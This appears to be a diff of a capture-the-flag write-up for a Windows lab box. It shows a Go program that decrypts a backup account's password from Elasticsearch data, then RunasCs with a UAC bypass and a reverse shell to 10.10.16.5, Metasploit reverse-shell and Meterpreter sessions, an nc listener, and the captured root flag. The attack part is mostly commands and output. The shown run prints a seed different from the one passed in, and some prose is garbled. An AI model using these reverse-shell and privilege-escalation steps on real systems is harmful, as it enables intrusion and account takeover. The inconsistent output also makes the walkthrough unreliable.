@@ -563,195 +563,279 @@ $ curl -k -u "user:DumpPassword\$Here" -X GET https://127.0.0.1:9200
 We get a cid and a blob of elastic:
 
 ```bash
-$ curl -k -u "user:DumpPassword\$Here" -X GET https://127.0.0.1:9200/seed/_search
-{"took":540,"timed_out":false,"_shards":{"total":1,"successful":1,"skipped":0,"failed":0},"hits":{"total":{"value":1,"relation":"eq"},"max_score":1.0,"hits":[{"_index":"seed","_id":"1","_score":1.0,"_source":{
-    "seed":  73904292
-}}]}}
+$ curl -k -u "user:DumpPassword\$Here" -X GET https://127.0.0.1:9200/seed/_search | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   237  100   237    0     0    326      0 --:--:-- --:--:-- --:--:--   326
+{
+  "took": 4,
+  "timed_out": false,
+  "_shards": {
+    "total": 1,
+    "successful": 1,
+    "skipped": 0,
+    "failed": 0
+  },
+  "hits": {
+    "total": {
+      "value": 1,
+      "relation": "eq"
+    },
+    "max_score": 1,
+    "hits": [
+      {
+        "_index": "seed",
+        "_id": "1",
+        "_score": 1,
+        "_source": {
+          "seed": 12120294
+        }
+      }
+    ]
+  }
+}
 
-$ curl -k -u "user:DumpPassword\$Here" -X GET "https://localhost:9200/user-00001/_search"
-{"took":5,"timed_out":false,"_shards":{"total":1,"successful":1,"skipped":0,"failed":0},"hits":{"total":{"value":1,"relation":"eq"},"max_score":1.0,"hits":[{"_index":"user-00001","_id":"56J504sB-CyYs_kLKirB","_score":1.0,"_source":{"blob":"2hmaf2ygWl35WlGxkC6jI49Pl1PNKeRME4DogNf6bL_I4aq8VeCfDMHu6DeDzJ1s49Y2mmcjemA=","timestamp":"2023-11-15T06:53:34.7341699-08:00"}}]}}
+$ curl -k -u "user:DumpPassword\$Here" -X GET "https://localhost:9200/user-00001/_search" | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   368  100   368    0     0    334      0  0:00:01  0:00:01 --:--:--   334
+{
+  "took": 3,
+  "timed_out": false,
+  "_shards": {
+    "total": 1,
+    "successful": 1,
+    "skipped": 0,
+    "failed": 0
+  },
+  "hits": {
+    "total": {
+      "value": 1,
+      "relation": "eq"
+    },
+    "max_score": 1,
+    "hits": [
+      {
+        "_index": "user-00001",
+        "_id": "-pT83YsB8kppgnucHjK6",
+        "_score": 1,
+        "_source": {
+          "blob": "UncMJA4aBZ4khzH4YkiBsMgsBd3Ix8hXNN0_Tbs5_CveqbcC93lGtolPosdqK6U9fQmFbVo-ZUs=",
+          "timestamp": "2023-11-17T07:52:49.52274-08:00"
+        }
+      }
+    ]
+  }
+}
 ```
+
+Analyzing the code C:\temp\www\internal\content\posts\internal-laps-alpha\a.exe (with Ghidra), it is found that the parameters of the initial and encrypted large binary objects are in ES. The cmd.exe program is called and the net command is used to change the user's backup password.
+
+Scroll down and see the genkey function, which is linked to the content above main.main. Using the seed parameter as a reference, the number of keys generated is randomly +1.
+
+At the bottom there is main.encrypt, which is the encryption parameter.For AES, base64 is used.
+
+In conjunction with the analysis C:\temp\www\internal\content\posts\internal-laps-alpha\a.exe (with Ghidra) we need to decrypt the data corresponding to ES i.e. base64 of the initial number and user-00001 to get the last password of the backup user and it is random.Write a go program to crack. it.
 
 We write a program that will automatically retrieve parameters from elastic and decode the password:
 
-```
+```go
 package main
 
 import (
- "crypto/aes"
- "crypto/cipher"
- "crypto/tls"
- "encoding/base64"
- "encoding/json"
- "fmt"
- "io"
- "log"
- "math/rand"
- "net/http"
+        "crypto/aes"
+        "crypto/cipher"
+        "encoding/base64"
+        "fmt"
+        "log"
+        "math/rand"
+        "os"
+        "strconv"
 )
 
-var URL = "https://127.0.0.1:9200"
-var USERNAME = "user"
-var PASSWORD = "DumpPassword$Here"
-
-type Blob struct {
- Took     int  `json:"took"`
- TimedOut bool `json:"timed_out"`
- Shards   struct {
-  Total      int `json:"total"`
-  Successful int `json:"successful"`
-  Skipped    int `json:"skipped"`
-  Failed     int `json:"failed"`
- } `json:"_shards"`
- Hits struct {
-  Total struct {
-   Value    int    `json:"value"`
-   Relation string `json:"relation"`
-  } `json:"total"`
-  MaxScore float64 `json:"max_score"`
-  Hits     []struct {
-   Index  string  `json:"_index"`
-   ID     string  `json:"_id"`
-   Score  float64 `json:"_score"`
-   Source struct {
-    Blob      string `json:"blob"`
-    Timestamp string `json:"timestamp"`
-   } `json:"_source"`
-  } `json:"hits"`
- } `json:"hits"`
+func checkErr(err error) {
+        if err != nil {
+                log.Fatal(err)
+        }
 }
 
-type Seed struct {
- Took     int  `json:"took"`
- TimedOut bool `json:"timed_out"`
- Shards   struct {
-  Total      int `json:"total"`
-  Successful int `json:"successful"`
-  Skipped    int `json:"skipped"`
-  Failed     int `json:"failed"`
- } `json:"_shards"`
- Hits struct {
-  Total struct {
-   Value    int    `json:"value"`
-   Relation string `json:"relation"`
-  } `json:"total"`
-  MaxScore float64 `json:"max_score"`
-  Hits     []struct {
-   Index  string  `json:"_index"`
-   ID     string  `json:"_id"`
-   Score  float64 `json:"_score"`
-   Source struct {
-    Seed int `json:"seed"`
-   } `json:"_source"`
-  } `json:"hits"`
- } `json:"hits"`
+func genKey(seed int) (key []byte) {
+        rand.Seed(int64(seed))
+        for i := 0; i < 0x10; i++ {
+                val := rand.Intn(0xfe)
+                key = append(key, byte(val+1))
+        }
+        return
 }
 
-func getBlob() string {
- client := &http.Client{
-  Transport: &http.Transport{
-   TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-  },
- }
- req, err := http.NewRequest("GET", fmt.Sprintf("%s/user-00001/_search", URL), nil)
- if err != nil {
-  log.Fatal(err)
- }
- req.SetBasicAuth(USERNAME, PASSWORD)
- res, err := client.Do(req)
- if err != nil {
-  log.Fatal(err)
- }
- defer res.Body.Close()
- bodyBytes, err := io.ReadAll(res.Body)
- if err != nil {
-  log.Fatal(err)
- }
- var blob Blob
- err = json.Unmarshal(bodyBytes, &blob)
- if err != nil {
-  log.Fatal(err)
- }
- return blob.Hits.Hits[0].Source.Blob
-}
+func decrypt(seed int, enc []byte) (data []byte) {
+        fmt.Printf("Seed: %v\n", seed)
+        key := genKey(seed)
+        fmt.Printf("Key: %v\n", key)
+        iv := enc[:aes.BlockSize]
+        fmt.Printf("IV: %v\n", iv)
+        data = enc[aes.BlockSize:]
 
-func getSeed() int64 {
- client := &http.Client{
-  Transport: &http.Transport{
-   TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-  },
- }
- req, err := http.NewRequest("GET", fmt.Sprintf("%s/seed/_search", URL), nil)
- if err != nil {
-  log.Fatal(err)
- }
- req.SetBasicAuth(USERNAME, PASSWORD)
- res, err := client.Do(req)
- if err != nil {
-  log.Fatal(err)
- }
- defer res.Body.Close()
- bodyBytes, err := io.ReadAll(res.Body)
- if err != nil {
-  log.Fatal(err)
- }
- var seed Seed
- err = json.Unmarshal(bodyBytes, &seed)
- if err != nil {
-  log.Fatal(err)
- }
- return int64(seed.Hits.Hits[0].Source.Seed)
+        block, err := aes.NewCipher(key)
+        checkErr(err)
+
+        stream := cipher.NewCFBDecrypter(block, iv)
+        stream.XORKeyStream(data, data)
+        fmt.Printf("Plaintext: %s\n", data)
+        return
 }
 
 func main() {
- seed := getSeed()
- blob := getBlob()
+        if len(os.Args) != 3 {
+                return
+        }
+        seed, err := strconv.Atoi(os.Args[1])
+        checkErr(err)
+        enc, err := base64.URLEncoding.DecodeString(os.Args[2])
+        checkErr(err)
 
- key := genKey(seed)
- m, err := decryptMessage(key, blob)
- if err != nil {
-  log.Println(err)
- }
- fmt.Println(m)
-}
-
-func genKey(seed int64) []byte {
- rand.Seed(seed)
- out := make([]byte, 16)
- for i := 0; i < 16; i++ {
-  out[i] = byte(rand.Intn(254) + 1)
- }
- return out
-}
-
-func decryptMessage(key []byte, message string) (string, error) {
- cipherText, err := base64.URLEncoding.DecodeString(message)
- if err != nil {
-  return "", fmt.Errorf("could not base64 decode: %v", err)
- }
-
- block, err := aes.NewCipher(key)
- if err != nil {
-  return "", fmt.Errorf("could not create new cipher: %v", err)
- }
-
- if len(cipherText) < aes.BlockSize {
-  return "", fmt.Errorf("invalid ciphertext block size")
- }
-
- offset := 0
- iv := cipherText[offset : offset+aes.BlockSize]
- cipherText = cipherText[aes.BlockSize:]
-
- stream := cipher.NewCFBDecrypter(block, iv)
- stream.XORKeyStream(cipherText, cipherText)
-
- return string(cipherText), nil
+        decrypt(seed, enc)
 }
 ```
 
-```bash
-GOOS=windows GOARCH=amd64 go build p.go
+```shell
+go run cxk.go 12120294 UncMJA4aBZ4khzH4YkiBsMgsBd3Ix8hXNN0_Tbs5_CveqbcC93lGtolPosdqK6U9fQmFbVo-ZUs=
+Seed: 37872930
+Key: [217 92 190 247 99 23 97 60 239 123 227 6 169 173 16 186]
+IV: [7 27 86 179 181 158 173 51 9 188 143 147 88 224 109 187]
+Plaintext: VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy
 ```
 
-**To be continued**...
+Then load RunasCs.exe, do a UAC bypass and restore, remember to move fast, the initial value and large binary object will change.
+
+Example:
+
+```shell
+.\RunasCs.exe backup VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy cmd.exe -r 10.10.16.5:4445 --bypass-uac
+```
+
+Exploit:
+
+```shell
+$ msfconsole -q
+
+[msf](Jobs:0 Agents:0) >>
+[msf](Jobs:0 Agents:0) >> use windows/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LHOST 10.10.16.5
+LHOST => 10.10.16.5
+[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LPORT 4444
+LPORT => 4444
+[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> exploit
+[*] Payload Handler Started as Job 0
+
+[*] Started reverse TCP handler on 10.10.16.5:4444
+[msf](Jobs:1 Agents:0) payload(windows/shell_reverse_tcp) >> [*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.11.240:58583) at 2023-11-17 17:50:27 +0200
+
+[msf](Jobs:1 Agents:1) payload(windows/shell_reverse_tcp) >> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                      Connection
+  --  ----  ----               -----------                                                      ----------
+  1         shell x86/windows  Shell Banner: Microsoft Windows [Version 10.0.19045.3636] -----  10.10.16.5:4444 -> 10.10.11.240:58583 (10.10.11.240)
+
+[msf](Jobs:1 Agents:1) payload(windows/shell_reverse_tcp) >> sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.16.5:4433
+[msf](Jobs:2 Agents:1) payload(windows/shell_reverse_tcp) >>
+[*] Sending stage (200774 bytes) to 10.10.11.240
+[*] Meterpreter session 2 opened (10.10.16.5:4433 -> 10.10.11.240:58586) at 2023-11-17 17:51:59 +0200
+[*] Stopping exploit/multi/handler
+
+[msf](Jobs:1 Agents:3) payload(windows/shell_reverse_tcp) >> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                      Connection
+  --  ----  ----                     -----------                                                      ----------
+  1         shell x86/windows        Shell Banner: Microsoft Windows [Version 10.0.19045.3636] -----  10.10.16.5:4444 -> 10.10.11.240:58583 (10.10.11.240)
+  2         meterpreter x64/windows  NAPPER\ruben @ NAPPER                                            10.10.16.5:4433 -> 10.10.11.240:58586 (10.10.11.240)
+  3         meterpreter x64/windows  NAPPER\ruben @ NAPPER                                            10.10.16.5:4433 -> 10.10.11.240:58594 (10.10.11.240)
+
+[msf](Jobs:1 Agents:3) payload(windows/shell_reverse_tcp) >> sessions 2
+[*] Starting interaction with 2...
+
+(Meterpreter 2)(C:\Windows\system32) > cd "C:\Temp"
+(Meterpreter 2)(C:\Temp) > upload RunasCs.exe
+[*] Uploading  : /root/RunasCs.exe -> RunasCs.exe
+[*] Uploaded 50.50 KiB of 50.50 KiB (100.0%): /root/RunasCs.exe -> RunasCs.exe
+[*] Completed  : /root/RunasCs.exe -> RunasCs.exe
+(Meterpreter 2)(C:\Temp) > shell
+Process 6332 created.
+Channel 9 created.
+Microsoft Windows [Version 10.0.19045.3636]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Temp>.\RunasCs.exe backup VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy cmd.exe -r 10.10.16.5:4445 --bypass-uac
+.\RunasCs.exe backup VbHTvlHTzJkDRVaXKITYHMobAWlAldAnyVgJqVvy cmd.exe -r 10.10.16.5:4445 --bypass-uac
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-39aa6$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2992 created in background.
+```
+
+Catch the shell:
+
+```shell
+$ nc -lnvp 4445
+listening on [any] 4445 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.240] 58662
+Microsoft Windows [Version 10.0.19045.3636]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+napper\backup
+
+C:\Windows\system32>cd C:\Users
+cd C:\Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CB08-11BF
+
+ Directory of C:\Users
+
+06/09/2023  12:33 AM    <DIR>          .
+06/09/2023  12:33 AM    <DIR>          ..
+10/29/2023  12:05 PM    <DIR>          Administrator
+06/09/2023  12:38 AM    <DIR>          backup
+06/07/2023  11:56 PM    <DIR>          DefaultAppPool
+06/07/2023  11:44 PM    <DIR>          internal
+06/07/2023  05:37 AM    <DIR>          Public
+10/29/2023  12:05 PM    <DIR>          ruben
+               0 File(s)              0 bytes
+               8 Dir(s)   3,031,638,016 bytes free
+
+C:\Users>cd Administrator\Desktop
+cd Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CB08-11BF
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/09/2023  05:18 AM    <DIR>          .
+06/09/2023  05:18 AM    <DIR>          ..
+06/08/2023  02:13 AM             2,348 Microsoft Edge.lnk
+11/17/2023  07:48 AM                34 root.txt
+               2 File(s)          2,382 bytes
+               2 Dir(s)   3,034,595,328 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+c9fe7245677c0e42cb826d9d5efd63d4
+```
